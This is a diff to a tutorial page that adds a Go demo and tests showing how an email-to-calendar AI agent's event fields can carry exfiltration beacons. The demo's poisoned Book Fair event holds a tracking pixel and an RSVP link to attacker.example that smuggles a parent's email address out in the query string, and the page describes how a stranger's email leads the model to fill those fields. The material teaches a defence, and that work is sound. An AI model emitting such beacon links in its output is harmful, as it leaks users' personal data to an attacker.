@@ -20,9 +20,110 @@ cd posts/05.2-the-calendar-field-exfil
 go run .
 ```
 
+The whole program is on this page, in the order it runs, so you can type it in instead of cloning. Make an empty folder, run `go mod init exfil`, then `go get github.com/t0ul/emaildrop@` followed by the version on the first `require` line below, and put the code in one file called `main.go`:
+
+<!-- listing: go.mod#all -->
+```
+module github.com/t0ul/ai-security-engineering/posts/05.2-the-calendar-field-exfil
+
+go 1.27.1
+
+// The agent's real calendar writer and event shape. No overrides.
+require github.com/t0ul/emaildrop v0.0.0-20261011232453-771805568f76
+```
+<!-- /listing -->
+
+## The spine of the program
+
+The top of the file names the one thing that must never survive into a calendar file, the attacker's host, and builds the poisoned event: a plausible Book Fair with a tracking beacon in its location and, in its notes, a link that smuggles a parent's address out in the query string. `main` writes that event with a naive writer and with the agent's real one and checks for the host in each file.
+
+<!-- listing: main.go#head -->
+```go
+// Command main is the runnable demo for lesson 05.2, the calendar-field exfil.
+//
+// Run it with:
+//
+//	go run .
+//
+// The agent's only output is an inert .ics file. Inert does not mean harmless: a
+// URL hidden in an event's location or notes is a beacon that fires when a calendar
+// client renders the field, and it can carry data out in its query string. This
+// demo writes an event whose fields carry an exfiltration URL with a naive writer
+// and finds the URL in the file, then writes the same event with the agent's real
+// writer and finds it stripped. Deterministic, no model.
+package main
+
+import (
+	"fmt"
+	"os"
+	"strings"
+
+	"github.com/t0ul/emaildrop/pkg/agent/ics"
+	"github.com/t0ul/emaildrop/pkg/agent/schema"
+)
+
+// attackerHost is what must never survive into a calendar file.
+const attackerHost = "attacker.example"
+
+// exfilEvent is a plausible event whose fields were poisoned: a tracking beacon in
+// the location, and a link in the notes that smuggles a parent's address out.
+func exfilEvent() schema.Event {
+	ev := schema.New("Book Fair", "2026-10-10T09:00:00")
+	ev.Location = "Library http://attacker.example/pixel.gif"
+	ev.Notes = "RSVP at http://attacker.example/exfil?who=parent.contact@example.com"
+	return ev
+}
+
+func main() {
+	leaked := naiveLeaks()
+	blocked := writerStrips()
+
+	fmt.Println()
+	if leaked && blocked {
+		fmt.Println("attack blocked (the receipt): the beacon survives a naive writer, stripped by the real one")
+	} else {
+		fmt.Println("a control did not hold")
+		os.Exit(1)
+	}
+}
+```
+<!-- /listing -->
+
 ## I. A field is a channel
 
-Take an ordinary event, a Book Fair, whose fields have been poisoned: a tracking pixel in the location, and a notes line that smuggles a parent's address out in a link's query string. Write it the obvious way, serializing each field straight into the `.ics`, and look at what you get:
+Take that event and write it the obvious way, serializing each field straight into the `.ics`. That is `naiveICS`, a faithful serializer, and under it the run that prints the two poisoned lines and asks whether the attacker's host is in the file:
+
+<!-- listing: main.go#before: a naive writer puts the fields in as-is -->
+```go
+// ---- before: a naive writer puts the fields in as-is ----
+
+// naiveICS is the calendar writer I would write first: take the event's fields and
+// put them straight into the .ics. It is a faithful serializer, which is exactly
+// the problem, because the fields are attacker-controlled.
+func naiveICS(ev schema.Event) string {
+	var b strings.Builder
+	b.WriteString("BEGIN:VCALENDAR\r\nBEGIN:VEVENT\r\n")
+	fmt.Fprintf(&b, "SUMMARY:%s\r\n", ev.Title)
+	fmt.Fprintf(&b, "LOCATION:%s\r\n", ev.Location)
+	fmt.Fprintf(&b, "DESCRIPTION:%s\r\n", ev.Notes)
+	b.WriteString("END:VEVENT\r\nEND:VCALENDAR\r\n")
+	return b.String()
+}
+
+func naiveLeaks() bool {
+	fmt.Println("== before: a naive calendar writer ==")
+	text := naiveICS(exfilEvent())
+	for _, l := range lines(text, "LOCATION", "DESCRIPTION") {
+		fmt.Printf("  %s\n", l)
+	}
+	present := strings.Contains(text, attackerHost)
+	fmt.Printf("  the beacon host %q is in the file: %v (it fires when the event is rendered)\n", attackerHost, present)
+	return present
+}
+```
+<!-- /listing -->
+
+Look at what you get:
 
 ```
 == before: a naive calendar writer ==
@@ -37,16 +138,102 @@ Both URLs are right there in the file. The naive writer did nothing wrong as a s
 
 The writer has to treat those fields as what they are: untrusted output, filled by a model that read a stranger's email. So the agent's real calendar writer, `ics.Write`, runs every field through a sanitizer on the way out. It finds links and active schemes, plain `http` and `https` but also the sneakier `data:` and `javascript:`, and replaces each with a visible placeholder, and it returns a count of how many it pulled out so the removal is auditable. What it defends against is exactly this: a URL in a rendered field can never leave the agent, because the agent never writes one.
 
-Here is the same poisoned event through the real writer:
+Here is the same poisoned event through the real writer. The whole defended path is the one call to `ics.Write`, which returns the text, how many links it removed, and an error:
+
+<!-- listing: main.go#after: the agent's real writer sanitizes every field -->
+```go
+// ---- after: the agent's real writer sanitizes every field ----
+
+func writerStrips() bool {
+	fmt.Println("\n== after: the agent's real ics.Write ==")
+	text, removed, err := ics.Write([]schema.Event{exfilEvent()}, "email-to-calendar")
+	if err != nil {
+		panic(err)
+	}
+	for _, l := range lines(text, "LOCATION", "DESCRIPTION") {
+		fmt.Printf("  %s\n", l)
+	}
+	present := strings.Contains(text, attackerHost)
+	fmt.Printf("  links/schemes removed: %d; the beacon host in the file: %v\n", removed, present)
+	return !present
+}
+```
+<!-- /listing -->
+
+What comes out:
 
 ```
 == after: the agent's real ics.Write ==
   LOCATION:Library [link removed]
   DESCRIPTION:RSVP at [link removed]
+  DESCRIPTION:Book Fair
   links/schemes removed: 2; the beacon host in the file: false
 ```
 
 Two links removed, and the attacker's host is nowhere in the file. The event is still a perfectly good calendar entry, a Book Fair at the library with an RSVP note, it just no longer carries a beacon. The exfiltration channel went from open to closed, measured by the one thing that matters: whether the attacker's host survives into the file, and it does not.
+
+The one helper picks the two field lines out of the calendar text for printing:
+
+<!-- listing: main.go#helpers -->
+```go
+// ---- helpers ----
+
+func lines(text string, prefixes ...string) []string {
+	var out []string
+	for _, l := range strings.Split(text, "\r\n") {
+		for _, p := range prefixes {
+			if strings.HasPrefix(l, p) {
+				out = append(out, l)
+			}
+		}
+	}
+	return out
+}
+```
+<!-- /listing -->
+
+That is the whole program. Its tests assert both halves, and separately that the real writer reports what it stripped and never lets the host through. Put them next to `main.go` as `contract_test.go`:
+
+<!-- listing: contract_test.go#all -->
+```go
+package main
+
+import (
+	"strings"
+	"testing"
+
+	"github.com/t0ul/emaildrop/pkg/agent/ics"
+	"github.com/t0ul/emaildrop/pkg/agent/schema"
+)
+
+// Deterministic, no model. A naive writer carries the exfil URL into the calendar
+// file; the agent's real writer strips every link and active scheme from the
+// fields, so the beacon host never survives.
+
+func TestNaiveLeaksBeaconStrippedByWriter(t *testing.T) {
+	if !naiveLeaks() {
+		t.Fatal("a naive writer should carry the beacon into the file; otherwise there is nothing to fix")
+	}
+	if !writerStrips() {
+		t.Fatal("ics.Write must strip the beacon from every field")
+	}
+}
+
+func TestWriterReportsRemovals(t *testing.T) {
+	_, removed, err := ics.Write([]schema.Event{exfilEvent()}, "cal")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if removed < 2 {
+		t.Fatalf("expected the writer to report the links it stripped; removed=%d", removed)
+	}
+	text, _, _ := ics.Write([]schema.Event{exfilEvent()}, "cal")
+	if strings.Contains(text, attackerHost) {
+		t.Fatal("the beacon host survived into the .ics")
+	}
+}
+```
+<!-- /listing -->
 
 ## A note on the links we do keep
 
